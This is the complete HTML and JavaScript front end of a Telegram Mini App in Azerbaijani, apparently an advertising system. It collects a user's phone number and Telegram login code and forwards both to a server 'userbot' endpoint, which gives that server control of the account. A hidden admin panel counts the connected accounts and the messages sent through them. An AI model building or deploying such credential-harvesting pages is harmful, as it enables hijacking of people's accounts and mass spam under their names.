<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reklam İdarəetmə</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body, html { height: 100%; width: 100%; overflow: hidden; background: #000; }
        
        .container {
            height: 100vh;
            width: 100vw;
            background-image: url('https://i.ibb.co/3mpQz6vc/MG-20261108-WA0070.jpg');
            background-size: cover;
            background-position: center;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .overlay {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.75); /* Qaralmış fon */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            padding: 20px;
            backdrop-filter: blur(5px);
        }

        h2 { margin-bottom: 25px; text-align: center; font-weight: 500; font-size: 22px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }

        .form-box {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
        }

        input {
            width: 100%;
            padding: 16px;
            margin-bottom: 15px;
            border-radius: 12px;
            border: 1px solid #444;
            background: rgba(30, 30, 30, 0.9);
            color: white;
            font-size: 18px;
            text-align: center;
            outline: none;
            letter-spacing: 1px;
        }

        input:focus { border-color: #0088cc; }

        button {
            width: 100%;
            padding: 16px;
            background: #2AABEE; /* Telegram Blue */
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 15px;
        }

        button:active { background: #1c87c9; transform: scale(0.98); }

        #code-section { display: none; }
        
        #admin-panel { display: none; width: 100%; max-width: 350px; text-align: center; }
        .stats-box {
            background: rgba(30, 30, 30, 0.9);
            padding: 20px;
            border-radius: 12px;
            margin-top: 15px;
            border: 1px solid #444;
            font-size: 14px;
            line-height: 1.6;
        }
        
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2AABEE;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="overlay">
            <h2>Mərkəzi Reklam Sistemi</h2>
            
            <!-- Userbot Qoşulma Forması -->
            <div id="auth-section" class="form-box">
                <input type="tel" id="phone" placeholder="Telefon nömrəsi (+994...)" autocomplete="off">
                <button onclick="sendCode()">Kod Göndər</button>
                <div class="loader" id="loader1"></div>
                
                <div id="code-section">
                    <input type="number" id="code" placeholder="5 rəqəmli kod" autocomplete="off">
                    <button onclick="verifyCode()">Təsdiqlə</button>
                    <div class="loader" id="loader2"></div>
                </div>
            </div>

            <!-- Admin Panel (Gizli olacaq) -->
            <div id="admin-panel" class="form-box">
                <h3 style="margin-bottom: 15px;">Admin Panel</h3>
                <button onclick="loadDashboard()">Statistikaları Yenilə</button>
                <div id="stats-box" class="stats-box">Yüklənir...</div>
            </div>
        </div>
    </div>

    <script>
        // Telegram WebApp-i işə salırıq
        const tg = window.Telegram.WebApp;
        tg.expand(); // Tam ekran edir
        tg.ready();

        const initData = tg.initData;
        let currentUserId = null;
        let currentPhoneHash = ""; // Kodu yoxlayarkən lazım olacaq

        // İlk yüklənmədə istifadəçini yoxla (Admin olub-olmadığını)
        fetch('/api/auth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ initData })
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                if (data.isAdmin) {
                    // Əgər istifadəçi Adminsə, Auth formunu gizlət, Admin paneli göstər
                    document.getElementById('auth-section').style.display = 'none';
                    document.getElementById('admin-panel').style.display = 'block';
                } else {
                    // Adi istifadəçidirsə, sadəcə ID-ni yadda saxla
                    currentUserId = JSON.parse(new URLSearchParams(initData).get('user')).id;
                }
            }
        })
        .catch(err => console.error("Auth xətası:", err));

        // Kod göndərmə funksiyası
        function sendCode() {
            const phoneInput = document.getElementById('phone').value;
            if (!phoneInput || phoneInput.length < 9) {
                tg.showAlert("Zəhmət olmasa düzgün telefon nömrəsi daxil edin (+994...)");
                return;
            }

            document.getElementById('loader1').style.display = 'block';

            fetch('/api/userbot/send-code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phoneInput })
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('loader1').style.display = 'none';
                if (data.success) {
                    currentPhoneHash = data.phoneHash;
                    document.getElementById('code-section').style.display = 'block';
                    tg.showAlert("Kod Telegramınıza göndərildi!");
                } else {
                    tg.showAlert("Xəta: " + (data.error || "Bilinməyən xəta"));
                }
            })
            .catch(err => {
                document.getElementById('loader1').style.display = 'none';
                tg.showAlert("Server xətası baş verdi.");
            });
        }

        // Kodu təsdiqləmə funksiyası
        function verifyCode() {
            const code = document.getElementById('code').value;
            const phone = document.getElementById('phone').value;

            if (!code || code.length < 4) {
                tg.showAlert("Kodu tam daxil edin.");
                return;
            }

            document.getElementById('loader2').style.display = 'block';

            fetch('/api/userbot/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    phone: phone, 
                    code: code, 
                    phoneCodeHash: currentPhoneHash,
                    userId: currentUserId 
                })
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('loader2').style.display = 'none';
                if (data.success) {
                    tg.showAlert("Hesab uğurla qoşuldu! Sistemə keçid edilir...");
                    document.getElementById('auth-section').style.display = 'none';
                    // Burada növbəti səhifəyə (məsələn, reklam panelinə) yönləndirə bilərik
                } else {
                    tg.showAlert("Xəta: " + (data.error || "Kod yanlışdır"));
                }
            })
            .catch(err => {
                document.getElementById('loader2').style.display = 'none';
                tg.showAlert("Server xətası baş verdi.");
            });
        }

        // Admin panel statistikası
        function loadDashboard() {
            const statsBox = document.getElementById('stats-box');
            statsBox.innerHTML = "Yüklənir...";
            
            fetch('/api/admin/dashboard')
            .then(res => res.json())
            .then(data => {
                statsBox.innerHTML = `
                    <b>Ümumi İstifadəçi:</b> ${data.users ? data.users.length : 0}<br><br>
                    <b>Ümumi Göndəriş:</b> ${data.stats?.totalSent || 0}<br>
                    <b>Uğurlu:</b> ${data.stats?.success || 0}<br>
                    <b>Uğursuz:</b> ${data.stats?.failed || 0}
                `;
            })
            .catch(err => {
                statsBox.innerHTML = "Məlumat yüklənə bilmədi.";
            });
        }
    </script>
</body>
  </html>
